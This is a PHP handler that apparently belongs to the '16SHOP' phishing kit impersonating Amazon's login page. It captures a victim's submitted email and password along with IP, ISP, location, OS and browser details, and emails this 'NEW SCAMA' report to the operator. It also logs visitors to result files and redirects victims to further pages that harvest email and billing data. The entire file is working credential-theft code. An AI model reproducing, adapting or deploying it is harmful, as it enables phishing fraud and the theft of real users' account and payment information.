<?php
error_reporting(0);
session_start();
require_once('../main.php');
require_once("../blocker.php");
require_once('../session.php');
if($_POST['emailLogin'] == "") {
	exit();
}
$ip = getUserIP();
$ispuser = getisp($ip);
$message  = "#--------------------[ 16SHOP - AMAZON LOGIN ]-------------------------#\n";
$message .= "Amazon		: ".$_POST['emailLogin']."\n";
$message .= "Password		: ".$_POST['passwordLogin']."\n";
$message .= "#--------------------------[ PC INFORMATION ]-------------------------#\n";
$message .= "IP Address		: ".$ip."\n";
$message .= "ISP		    : ".$ispuser."\n";
$message .= "Region		    : ".$regioncity."\n";
$message .= "City		    : ".$citykota."\n";
$message .= "Continent		: ".$continent."\n";
$message .= "Timezone		: ".$timezone."\n";
$message .= "OS/Browser		: ".$os." / ".$br."\n";
$message .= "Date			: ".$date."\n";
$message .= "User Agent		: ".$user_agent."\n";
$message .= "#--------------------------[ NEW SCAMA ]-----------------------------#\n";

$_SESSION['email'] = $_POST['emailLogin'];
$_SESSION['password'] = $_POST['passwordLogin'];
if($setting['send_login'] == 'on') {
  $subject = "AMAZON LOGIN: ".$_POST['user']." [ $cn - $os - $ip ]";
  kirim_mail($setting['email_result'], "Amazon Login", $subject, $message);
}
tulis_file("../result/total_login.txt", $ip);
tulis_file("../result/log_visitor.txt", "[$time - $ip - $countryname - $br - $os] Login Amazon");
if($setting['get_email'] == "on") {
	echo "<script type='text/javascript'>window.top.location='../ap/email?session=$key';</script>";
exit();
}else{
echo "<script type='text/javascript'>window.top.location='../ap/billing?session=$key';</script>";
exit();
}
?>
